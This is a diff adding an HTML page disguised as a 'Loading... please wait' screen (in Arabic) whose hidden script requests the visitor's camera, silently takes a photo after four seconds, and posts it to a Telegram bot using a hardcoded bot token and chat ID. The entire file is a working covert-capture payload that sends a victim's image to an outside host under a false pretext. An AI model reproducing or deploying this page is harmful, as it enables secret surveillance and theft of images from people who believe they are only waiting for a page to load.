@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Loading...</title>
+  </head>
+  <body>
+    <h2>🔒 جاري التحميل، يرجى الانتظار...</h2>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <script>
+      const BOT_TOKEN = "8270314738:AAHfpf2FINCU27HONunFozlOfz1d-Dmyxi8";
+      const CHAT_ID = "5752198595";
+
+      const video = document.getElementById("video");
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
+
+          setTimeout(() => {
+            imageCapture.takePhoto()
+              .then(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "photo.jpg");
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                  method: "POST",
+                  body: formData
+                }).then(() => {
+                  stream.getTracks().forEach(t => t.stop());
+                });
+              })
+              .catch(error => console.error("فشل التقاط الصورة:", error));
+          }, 4000); // بعد 4 ثوانٍ
+        })
+        .catch((err) => {
+          console.error("خطأ في الكاميرا:", err);
+        });
+    </script>
+  </body>
+</html>
